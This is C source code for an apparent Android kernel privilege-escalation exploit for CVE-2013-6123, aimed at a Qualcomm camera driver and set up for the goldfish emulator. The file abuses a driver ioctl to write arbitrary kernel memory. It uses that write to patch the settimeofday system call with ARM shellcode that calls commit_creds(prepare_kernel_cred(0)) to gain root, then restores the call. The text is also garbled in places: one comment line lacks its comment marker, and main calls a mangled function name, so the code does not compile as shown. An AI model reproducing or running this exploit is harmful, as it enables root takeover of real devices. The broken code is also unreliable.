#include <stdio.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <stdbool.h>
#include <linux/fb.h>

#ifdef MSM_CAMERA_BIONIC
#include <sys/types.h>
#endif
#include <linux/videodev2.h>
#include <linux/types.h>
#include <linux/ioctl.h>
#ifdef __KERNEL__
#include <linux/cdev.h>
#endif


#include <stdbool.h>
#include <stdlib.h>

#include "kallsyms.h"






struct msm_ctrl_cmd {
	uint16_t type;
	uint16_t length;
	void *value;
	uint16_t status;
	uint32_t timeout_ms;
	int resp_fd; /* FIXME: to be used by the kernel, pass-through for now */
	int vnode_id;  /* video dev id. Can we overload resp_fd? */
	int queue_idx;
	uint32_t evt_id;
	uint32_t stream_type; /* used to pass value to qcamera server */
	int config_ident; /*used as identifier for config node*/
};
struct msm_camera_v4l2_ioctl_t {
	void __user *ioctl_ptr;
};





#define MSM_CAM_V4L2_IOCTL_CTRL_CMD_DONE \
	_IOWR('V', BASE_VIDIOC_PRIVATE + 4, struct msm_camera_v4l2_ioctl_t *)


static char g_dev_name[] = {"/dev/video100"};
#define MMAP_ADDRESS     0x50000000
//run in goldfish emulator
#define GOLD_FISH 1

#ifdef GOLD_FISH
typedef struct {
} arch_spinlock_t;

#else
typedef struct {
		volatile unsigned int slock;

} arch_spinlock_t;
#endif
	


typedef struct raw_spinlock {
	arch_spinlock_t raw_lock;
} raw_spinlock_t;


typedef struct spinlock {
	union {
		struct raw_spinlock rlock;
	};
} spinlock_t;

struct list_head
{
       struct list_head *next, *prev;
};

typedef struct __wait_queue_head {  
        spinlock_t lock;  
        struct list_head task_list;  
}wait_queue_head_t;

struct msm_device_queue {
	struct list_head list;
	spinlock_t lock;
	wait_queue_head_t wait;
	int max;
	int len;
	const char *name;
};

struct msm_cam_server_queue {
	uint32_t queue_active;
	struct msm_device_queue ctrl_q;
	struct msm_device_queue eventData_q;
	uint8_t *ctrl_data;
	uint32_t evt_id;
};



unsigned long int g_server_dev=0;
struct msm_cam_server_queue *p_fake_server_queue;


static unsigned char ptmx_device[] = "/dev/ptmx";
static unsigned char daemon_opt[] = "--daemon";
static unsigned char proc_kallsyms[] = "/proc/kallsyms";
static unsigned char commit_creds_str[] =  "commit_creds";
static unsigned char prepare_kernel_cred_str[] =  "prepare_kernel_cred";
static unsigned char sys_setresuid_str[] = "sys_setresuid";
static unsigned char ptmx_fops_str[] = "ptmx_fops";
static unsigned char sys_settimeofday_str[] = "sys_settimeofday";
static unsigned char g_server_dev_str[] = "g_server_dev";
struct cred;
struct task_struct;

typedef struct cred *(*prepare_kernel_cred_t)(struct task_struct *);
typedef int (*commit_creds_t)(struct cred *);

// Kernel functions and symbols
prepare_kernel_cred_t prepare_kernel_cred = 0;
commit_creds_t commit_creds = 0;
unsigned long int ptmx_fops = 0;
unsigned long int ptmx_fops_fsync_address = 0;
unsigned long int settimeofday_addr = 0;
int win=0;
struct msm_ctrl_cmd g_ctrl_cmd;

#ifdef GOLD_FISH
static void spin_lock_init(struct spinlock *lock)
{
  
}
#else
static void spin_lock_init(struct spinlock *lock)
{
	lock->rlock.raw_lock.slock=1;
  
}


#endif

//为了让g_server_dev.server_queue[command->queue_idx]可以落在0x50000000～0x50001000的位置。
int get_server_queue_index(int queue_size)
{
   int queue_index=(MMAP_ADDRESS+queue_size-g_server_dev)/queue_size;
   return queue_index;
}


void init_ctrl_cmd(struct msm_ctrl_cmd *p_ctrl_cmd,
											unsigned long queue_idx,
											void* address,
											unsigned long length)
{

	p_ctrl_cmd->queue_idx=queue_idx;
	p_ctrl_cmd->evt_id=0;
 	p_ctrl_cmd->length=length;
 	p_ctrl_cmd->value=(void *)address;
}

void init_device_queue(struct msm_device_queue *p_queue)
{
	p_queue->max=100;
	p_queue->len=1;
	spin_lock_init(&(p_queue->lock));
  为了让list_add_tail正常运行，我们可以设置该双向链表为空
	p_queue->list.prev=&(p_queue->list);
	p_queue->list.next=p_queue->list.prev;	
  //设置该双向链表为空。
	p_queue->wait.task_list.prev=&(p_queue->wait.task_list);
	p_queue->wait.task_list.next=p_queue->wait.task_list.prev;
	p_queue->name=(char *)MMAP_ADDRESS;
	spin_lock_init(&(p_queue->wait.lock));
	
}

void init_mmap_data(void *addr)
{
  memset(addr,0x01,0x1000);
 //init for cmd name and queue name with AAA
 *(unsigned long*)((unsigned long)addr)=0x00414141;

}
void init_server_queue(unsigned long address,
											int server_queue_size,
											int queue_size,
											int server_queue_index)
{
	
   printf("queueSize size:%d,server_queue size: %d,server_queue_index=%08x\r\n  ",
   queue_size,
   server_queue_size,
   server_queue_index);

   //程序还要调用msm_enqueue函数唤醒等待队列里的线程
   p_fake_server_queue=(struct msm_cam_server_queue*)(g_server_dev+server_queue_size*server_queue_index);
   printf("p_fake_server_queue=%p\r\n",p_fake_server_queue);
   p_fake_server_queue->queue_active=1;  
	 p_fake_server_queue->evt_id=0;
	 p_fake_server_queue->ctrl_data=(uint8_t *)address;
}

bool write_value_at_address(unsigned long address, int value)
{
  bool result=false;
  int fd_video= open(g_dev_name, O_RDWR);
  if (fd_video<0) {
     printf("open video100 fail");
 		 return result;
  }
  else
  {
 
  int queue_size=sizeof(struct msm_device_queue);
  int server_queue_size=sizeof(struct msm_cam_server_queue);
  int server_queue_index=0;
  struct msm_device_queue *p_queue;    
  void *addr=mmap((unsigned long *)MMAP_ADDRESS,0x1000,PROT_READ|PROT_WRITE|PROT_EXEC,MAP_SHARED|MAP_FIXED|MAP_ANONYMOUS,-1,0);//MAP_ANONYMOUS -1  匿名映射
	if((unsigned long *)addr!=(unsigned long *)MMAP_ADDRESS)
	{
    printf("mmap aborting\r\n");
    close(fd_video);
    return result;
  }

	//get the server_queue_index
  server_queue_index=get_server_queue_index(server_queue_size);
 	//init mmap data
 	init_mmap_data(addr);
 	//init_server_queue
	init_server_queue(address,server_queue_size,queue_size,server_queue_index);//wrirte address to 
	init_device_queue(&(p_fake_server_queue->ctrl_q));
	init_ctrl_cmd(&g_ctrl_cmd,server_queue_index,&value,4);	
	
  if (ioctl(fd_video, MSM_CAM_V4L2_IOCTL_CTRL_CMD_DONE, &g_ctrl_cmd) < 0) {
  	printf("ioctl aborting\r\n");
  	munmap (addr, 0x1000);
  	close(fd_video);
    return result;
      
  }
  close(fd_video);
  munmap (addr, 0x1000);
  result=true;
  return result;
 }


  return 1;
}



// Install an hook for our shellcode in the sys_settimeofday kernel function
int patch_sys_settimeofday(void) {
  unsigned long hook[9];
  int i = 0;

  // We are going to patch a system call directly in the kernel space so it is important to use
  // just kernel space addresses to avoid post exploitation crashes

  hook[0] = 0xe92d41f0; // push {r4, r5, r6, r7, r8, lr}         # prologue
  hook[1] = 0xe59f1010; // ldr r1, [pc, #16]                     # r1 = prepare_kernel_cred address   
  hook[2] = 0xe0200000; // eor r0, r0, r0                        # r0 = 0
  hook[3] = 0xe12fff31; // blx r1                                # prepare_kernel_cred(0)
  hook[4] = 0xe59f1008; // ldr r1, [pc, #8]                      # r1 = commit_creds
  hook[5] = 0xe12fff31; // blx r1                                # commit_creds(prepare_kernel_cred(0))
  hook[6] = 0xe8bd81f0; // pop {r4, r5, r6, r7, r8, pc}          # epilogue
  hook[7] = (unsigned int) prepare_kernel_cred;  // prepare_kernel_cred address
  hook[8] = (unsigned int) commit_creds;         // commit_creds address


  if(!settimeofday_addr)
    return 0;

    
for(i = 0; i < sizeof(hook)/4; i++) {
    //LOGD("Fixing instruction %d", i);
    sleep(1);
    write_value_at_address(settimeofday_addr + i*4, hook[i]);
   }

  return 1;

}






// Inject a syscall hook to perform the privileges escalation
void trigger_syscall_hook(void) {
  struct timeval now;
  int rc;
  // Random value
  now.tv_sec=866208142;
  now.tv_usec=290944;

 // Trigger
  rc=settimeofday(&now, NULL);
  sleep(2);
}


// Fix the hooked syscall so that no one else can get root
void fix_syscall_hook(void) {
  unsigned long int hook[3];
  int i = 0;

  // We are going to patch a system call directly in the kernel space so it is important to use
  // just kernel space addresses to avoid post exploitation crashes

  // Just do a "return 0"

  hook[0] = 0xe92d41f0; // push {r4, r5, r6, r7, r8, lr}         # prologue
  hook[1] = 0xe0200000; // eor r0, r0, r0                        # r0 = 0
  hook[2] = 0xe8bd81f0; // pop {r4, r5, r6, r7, r8, pc}          # epilogue

  if(!settimeofday_addr)
    return;

   for(i = 0; i < sizeof(hook)/4; i++) {
    sleep(1);
    write_value_at_address(settimeofday_addr + i*4, hook[i]);
   }
 
  
  
}



int get_symbols_from_kernel(void) {
	if(kallsyms_exist())
	{
	prepare_kernel_cred = (void *) kallsyms_get_symbol_address(prepare_kernel_cred_str);
  commit_creds = (void *) kallsyms_get_symbol_address(commit_creds_str);
  ptmx_fops =  (unsigned long int)kallsyms_get_symbol_address(ptmx_fops_str);
  settimeofday_addr = (unsigned long int) kallsyms_get_symbol_address(sys_settimeofday_str);  
	if(ptmx_fops)
		{
    ptmx_fops_fsync_address = (unsigned long int)ptmx_fops + 0x38;
  	g_server_dev= (unsigned long int)kallsyms_get_symbol_address("g_server_dev");
  }
  else
  {
  	//get it from goldfish system.map or emulator log.
    g_server_dev=0xc0354a30;
  }	  
    
  //g_server_dev= kallsyms_get_symbol_address(ptmx_fops_str);
  printf("get_symbols_from_kernel prepare_kernel_cred=%p, commit_creds=%p,ptmx_fops=%p,settimeofday_addr=%p,g_server_dev=%p\r\n",
         (void *)prepare_kernel_cred,
         (void *)commit_creds,
         (void *)ptmx_fops,
         (void *)settimeofday_addr,
         (void *)g_server_dev);

  return 0;
	}
	return -1;
	}
int main(int argc, char *argv[]) {	
	
	//get syscall address from kallsyms
	 printf("run cve-2013-6123 exploit.................\r\n");
	
   if(get_symbols_from_get_symbols_from_kernelkernel())
   {
     printf("get kallsyms fail\r\n");
     return 1;
   }
	 else
	 {
	 	//patch settimeofday syscall
	 printf("[+]patch_sys_settimeofday\r\n");
   patch_sys_settimeofday();
   //trigger the exploit
   printf("[+]trigger_syscall_hook\r\n");  
   trigger_syscall_hook();
   //fix settimeofday syscall
   printf("[+]fix_syscall_hook\r\n");  
   fix_syscall_hook();
   printf("exploit finish.................\r\n");
	}
	 return 0;
}
